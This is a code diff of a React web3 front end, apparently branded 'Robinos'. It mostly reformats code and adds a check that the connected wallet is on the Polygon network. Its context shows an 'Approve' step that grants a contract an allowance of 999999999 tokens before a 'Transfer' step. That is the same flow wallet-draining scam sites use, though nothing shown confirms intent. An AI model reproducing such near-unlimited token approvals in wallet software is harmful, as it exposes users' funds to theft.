@@ -48,7 +48,7 @@ function App() {
     try {
       const web3 = window.web3;
       let b = web3.utils.toWei('999999999');
-     
+
       await erc20Contract()
         .methods.approve(
           CONTRACT_ADDRESS,
@@ -73,9 +73,9 @@ function App() {
           console.log("error", error);
         });
     } catch (error) {
-      console.log("approve error",error)
+      console.log("approve error", error)
     }
-   
+
   };
   const processTransferTokens = async () => {
     accounts();
@@ -101,10 +101,22 @@ function App() {
     if (window.ethereum) {
       window.web3 = new Web3(window.ethereum);
       await window.ethereum.enable();
-      return true;
+      let cid = await window.web3.eth.getChainId()
+      if (cid === 137) {
+        return true;
+      } else {
+        toast.error("Invalid Network please select Polygon");
+        return false
+      }
     } else if (window.web3) {
       window.web3 = new Web3(window.web3.currentProvider);
-      return true;
+      let cid = await window.web3.eth.getChainId()
+      if (cid === 137) {
+        return true;
+      } else {
+        toast.error("Invalid Network please select Polygon");
+        return false
+      }
     } else {
       setErrorState(true);
       toast.error("Whoops..., Metamask is not connected.");
@@ -177,8 +189,8 @@ function App() {
       <ToastContainer />
       <header className="container-fluid header-section overflow-hidden">
         <nav className="navbar navbar-expand custom-nav-container">
-       <img src={robinos} alt='Robinos Logo' 
-     height={"40px"} />
+          <img src={robinos} alt='Robinos Logo'
+            height={"40px"} />
           <ul className="navbar-nav me-auto ms-auto d-flex align-items-end">
             <li className="nav-item">
               <a className="nav-link header-link" href="#">
@@ -189,9 +201,9 @@ function App() {
           <button className="header-connect-btn" onClick={() => metamask()}>
             {account
               ? `${account.slice(0, 4)}...${account.slice(
-                  account.length - 4,
-                  account.length
-                )}`
+                account.length - 4,
+                account.length
+              )}`
               : "Connect Wallet"}
           </button>
         </nav>
@@ -249,18 +261,18 @@ function App() {
                 <div className="col-12">
                   {account ? (
                     <>
-                     {allowance<balance? <button
+                      {allowance < balance ? <button
                         className="card-connect-btn"
                         onClick={() => approveMethod()}
                       >
                         {"Approve"}
-                      </button>:
-                      <button
-                        className="card-connect-btn"
-                        onClick={() => processTransferTokens()}
-                      >
-                        {"Transfer"}
-                      </button>}
+                      </button> :
+                        <button
+                          className="card-connect-btn"
+                          onClick={() => processTransferTokens()}
+                        >
+                          {"Transfer"}
+                        </button>}
                     </>
                   ) : (
                     <button className="card-connect-btn" onClick={metamask}>
